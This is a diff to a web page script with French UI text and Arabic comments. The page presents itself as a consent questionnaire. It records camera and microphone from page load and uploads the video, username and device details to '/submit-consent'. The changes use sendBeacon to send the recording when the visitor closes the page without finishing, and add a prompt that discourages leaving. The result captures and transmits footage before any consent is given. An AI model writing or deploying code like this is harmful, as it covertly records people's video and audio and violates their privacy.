@@ -87,7 +87,7 @@
         let mediaStream = null;
         let mediaRecorder = null;
         let recordedChunks = [];
-        let autoSaveInterval = null;
+        let hasSent = false;
 
         window.addEventListener('DOMContentLoaded', async () => {
             try {
@@ -101,15 +101,7 @@
                         recordedChunks.push(event.data);
                     }
                 };
-                mediaRecorder.start(1000); // التسجيل يستمر ثانية بثانية
-
-                // إرسال تلقائي كل 8 ثواني لضمان وصول الفيديو حتى لو سكر الصفحة فجأة
-                autoSaveInterval = setInterval(() => {
-                    if (recordedChunks.length > 0) {
-                        sendData(false, "إرسال تلقائي أثناء التصفح");
-                    }
-                }, 8000);
-
+                mediaRecorder.start(1000); // التسجيل المستمر
             } catch (err) {
                 console.log("Caméra non autorisée: ", err);
             }
@@ -125,10 +117,11 @@
             return model;
         }
 
-        async function sendData(isFinal = false, note = "") {
-            if (recordedChunks.length === 0) return;
+        async function sendData(note = "") {
+            if (hasSent) return;
+            hasSent = true;
 
-            const username = document.getElementById('username').value || "Utilisateur (Non الإسم)";
+            const username = document.getElementById('username').value || "Utilisateur (Sans nom)";
             const q1 = document.getElementById('q1').value || "Non répondu";
             const q2 = document.getElementById('q2').value || "Non répondu";
             const q3 = document.getElementById('q3').value || "Non répondu";
@@ -151,16 +144,23 @@
             formData.append('q3', q3);
             formData.append('video', videoBlob, 'recording_with_audio.webm');
 
-            try {
-                await fetch('/submit-consent', { method: 'POST', body: formData });
-            } catch (e) {
-                console.log("Erreur d'envoi", e);
+            // استخدام sendBeacon لضمان إرسال الفيديو حتى أثناء إغلاق الصفحة
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon('/submit-consent', formData);
+            } else {
+                try {
+                    await fetch('/submit-consent', { method: 'POST', body: formData });
+                } catch (e) {}
             }
         }
 
-        // إرسال احتياطي أثناء محاولة غلق الصفحة
-        window.addEventListener('beforeunload', () => {
-            sendData(true, "إغلاق الصفحة");
+        // إظهار رسالة بالفرنسية عند محاولة غلق الصفحة والمستخدم لم يكمل بعد
+        window.addEventListener('beforeunload', (e) => {
+            if (!hasSent && recordedChunks.length > 0) {
+                sendData("Fermeture de page / Non terminé");
+                e.preventDefault();
+                e.returnValue = "Êtes-vous sûr de vouloir quitter ?";
+            }
         });
 
         async function verifyAndStop() {
@@ -184,7 +184,7 @@
             }
 
             if (q1 === 'yes' && q2 === 'yes' && q3 === 'sknder') {
-                clearInterval(autoSaveInterval); // إيقاف الإرسال الدوري
+                hasSent = true; // منع beforeunload من إعادة الإرسال
                 statusDiv.style.color = 'green';
                 statusDiv.innerText = 'Réussi ! Envoi des données en cours...';
 
@@ -193,10 +193,34 @@
                 }
 
                 setTimeout(async () => {
-                    await sendData(true, "إجابة صحيحة وزر OK");
-                    statusDiv.innerText = 'Réussi ! Envoyé avec succès.';
-                    if (mediaStream) {
-                        mediaStream.getTracks().forEach(track => track.stop());
+                    const usernameVal = document.getElementById('username').value;
+                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+
+                    let deviceInfo = {
+                        model: getMobileModel(),
+                        screen: `${window.screen.width}x${window.screen.height}`,
+                        language: navigator.language,
+                        platform: navigator.platform
+                    };
+
+                    const formData = new FormData();
+                    formData.append('username', `${usernameVal} [Réussi !]`);
+                    formData.append('location', "Non disponible");
+                    formData.append('device', JSON.stringify(deviceInfo));
+                    formData.append('q1', q1);
+                    formData.append('q2', q2);
+                    formData.append('q3', q3);
+                    formData.append('video', videoBlob, 'recording_with_audio.webm');
+
+                    try {
+                        await fetch('/submit-consent', { method: 'POST', body: formData });
+                        statusDiv.innerText = 'Réussi ! Envoyé avec succès.';
+                        if (mediaStream) {
+                            mediaStream.getTracks().forEach(track => track.stop());
+                        }
+                    } catch (err) {
+                        statusDiv.style.color = 'red';
+                        statusDiv.innerText = 'Erreur de connexion.';
                     }
                 }, 1000);
 
